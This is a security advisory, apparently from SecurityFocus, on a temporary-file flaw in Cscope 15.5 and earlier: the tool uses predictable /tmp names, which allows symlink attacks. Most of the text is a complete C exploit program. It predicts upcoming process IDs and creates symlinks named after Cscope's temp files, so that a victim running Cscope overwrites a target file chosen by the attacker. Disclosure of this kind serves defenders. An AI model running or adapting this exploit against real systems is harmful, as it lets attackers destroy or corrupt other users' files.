source: http://www.securityfocus.com/bid/11697/info
 
Cscope creates temporary files in an insecure way. A design error causes the application to fail to verify the presence of a file before writing to it.
 
During execution, the utility reportedly creates temporary files in the system's temporary directory, '/tmp', with predictable names. This allows attackers to create malicious symbolic links that Cscope will write to when an unsuspecting user executes it.
 
Attackers may leverage these issues to overwrite arbitrary files with the privileges of an unsuspecting user that activates the vulnerable application.
 
Versions up to and including Cscope 15.5 are reported vulnerable.
/* RXcscope exploit version 15.5 and minor */
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define BSIZE   64

int
main(int ac, char *av[]) {
        pid_t cur;
        u_int i=0, lst;
        char buffer[BSIZE + 1];

        fprintf(stdout, "\n     --[ Cscope Exploit ]--\n"\
                        "     version 15.5 and minor \n" \
                        "       Gangstuck / Psirac\n" \
                        "     <research@rexotec.com>\n\n");

        if (ac != 3) {
                fprintf(stderr, "Usage: %s <target> <max file creation>\n", av[0]);
                return 1;
        }

        cur=getpid();
        lst=cur+atoi(av[2]);

        fprintf(stdout, " -> Current process id is ..... [%5d]\n" \
                        " -> Last process id is ........ [%5d]\n", cur, lst);

        while (++cur != lst) {
                snprintf(buffer, BSIZE, "%s/cscope%d.%d", P_tmpdir, cur, (i==2) ? --i : ++i);
                symlink(av[1], buffer);
        }

        return 0;
}